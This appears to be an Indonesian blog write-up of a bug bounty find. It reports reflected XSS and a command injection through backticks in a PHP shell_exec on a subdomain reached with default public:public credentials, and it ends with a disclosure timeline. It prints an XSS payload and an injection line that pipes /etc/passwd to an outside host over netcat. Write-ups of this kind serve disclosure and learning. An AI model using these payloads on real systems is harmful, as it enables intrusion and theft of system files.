---
layout: post
title: "[Bug Bounty] RCE and XSS On Private Program Cyber Army ID"
date: 2019-02-14
tags: [ "Bug Bounty", "RCE"]
---

## Reconnaissance 
Pada tahap reconnaissance,saya menggunakan nmap dengan perintah
`nmap sub.[redacted].id`

Disana terdapat beberapa port yang open, saya tertarik dengan port 8010. Pada saat tulisan ini dibuat saya coba scan lagi ternyata sudah filtered.

 ![](/images/bugbounty/net/1.png)

Saat saya buka sub.[redacted].id:8010, disana terdapat form login yang diketahui credentialnya menggunakan user dan password public:public. Disana terdapat beberapa menu (lupa screenshot). 

## XSS via POST Request
Untuk celah XSS ini berdampak pada 2 fungsi/menu:
- Menu dblist
- Menu dnsbse

Saya tertarik dengan fungsi search yg ada di menu dnsbse, disana ada form search yang merequest google search engine. Saya coba searcing "test", ternyata inputan kita ditampilkan di browser,hmmmm... Langsung terpikir untuk input payload XSS, dengan mengirim payload XSS sejuta ummat `"><script>alert("p00w")</script>` ternyata payload dirender dengan baik.

### POC 
- Script : https://pastebin.com/raw/zZN1pfSY

 ![](/images/bugbounty/net/2.png)


## Remote Code Execution
Masih ingat menu dnsbse? Tadi yang kita bahas kalau fungsi dnsbse juga merequest search engine google dan menampilkan hasilnya disana. Saya kira kalau fungsi dnsbse itu pake curl buat request ke server googlenya,asumsinya kira-kira seperti ini:
`shell_exec('curl {website with request}')`

Saya pikir ini bisa diexploitasi dengan SSRF (Server Side Request Forgery);

 ![](/images/bugbounty/net/3.png)

setelah mencoba beberapa payload SSRF, ternyata zonk wwkwkw `>_<` 
Saya sambil baca-baca referensi, akhirnya ketemu cara bypass stringnya hanya menggunakan backtick, sehingga kita dapat menjalankan perintah shell pada `shell_exec` tadi. 

Saya masukin request ke repeater di burp, lalu saya masukin payload \`cat /etc/passwd | nc XXX.199.221.101 9091\` pada parameter server, dan didapatkan result:

 ![](/images/bugbounty/net/4.png)

 ![](/images/bugbounty/net/5.png)

- 12 February Send Report
- 13 February Validation
- 14 February disclose
- Rewarded


## Reference
- [Getting a RCE — CTF Way
](https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f)
- [Cross Site Scripting (XSS)
](https://owasp.org/www-community/attacks/xss/)
